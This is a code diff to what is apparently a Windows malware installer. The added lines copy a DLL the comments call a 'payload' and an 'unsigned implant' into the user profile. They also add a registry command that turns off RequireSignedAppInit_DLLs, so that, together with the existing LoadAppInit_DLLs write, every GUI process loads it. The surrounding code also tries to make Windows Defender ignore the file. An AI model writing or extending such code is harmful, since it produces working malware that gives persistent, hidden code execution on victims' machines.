@@ -64,6 +64,27 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   NULL, SW_SHOWNORMAL);
     Sleep(1000);
   } else {
+    // ── Stage the payload: the registry writes below point every GUI process
+    // at %USERPROFILE%\AppInit_DLLs.dll, so the DLL must actually be there.
+    // main.exe used to assume SAFE.exe had put it — now it copies the DLL
+    // sitting next to itself, making the installer self-contained.
+    {
+        WCHAR src[MAX_PATH] = {0};
+        GetModuleFileNameW(NULL, src, MAX_PATH);
+        WCHAR* slash = wcsrchr(src, L'\\');
+        if (slash) {
+            wcscpy_s(slash + 1, MAX_PATH - (slash + 1 - src), L"AppInit_DLLs.dll");
+            WCHAR dst[MAX_PATH] = {0};
+            if (GetEnvironmentVariableW(L"USERPROFILE", dst, MAX_PATH) > 0) {
+                wcscat_s(dst, MAX_PATH, L"\\AppInit_DLLs.dll");
+                if (!CopyFileW(src, dst, FALSE) &&
+                    GetLastError() != ERROR_FILE_EXISTS)
+                    printf("[!] Could not stage DLL into %ls (err %lu)\n",
+                           dst, GetLastError());
+            }
+        }
+    }
+
     if (IsDefenderRunning()) {
       // make window defender ignore this file at all cost
       wstring filename = GetCurrentFile();
@@ -86,6 +107,10 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         L"C:\\Windows\\System32\\reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows "
         L"NT\\CurrentVersion\\Windows\" /v LoadAppInit_DLLs /t REG_DWORD /d 1 "
         L"/f",
+        // Without this, 64-bit Windows silently skips the unsigned implant.
+        L"C:\\Windows\\System32\\reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows "
+        L"NT\\CurrentVersion\\Windows\" /v RequireSignedAppInit_DLLs /t "
+        L"REG_DWORD /d 0 /f",
     };
     int len = sizeof(processes) / sizeof(processes[0]);
     for (int i = 0; i < len; i++) {
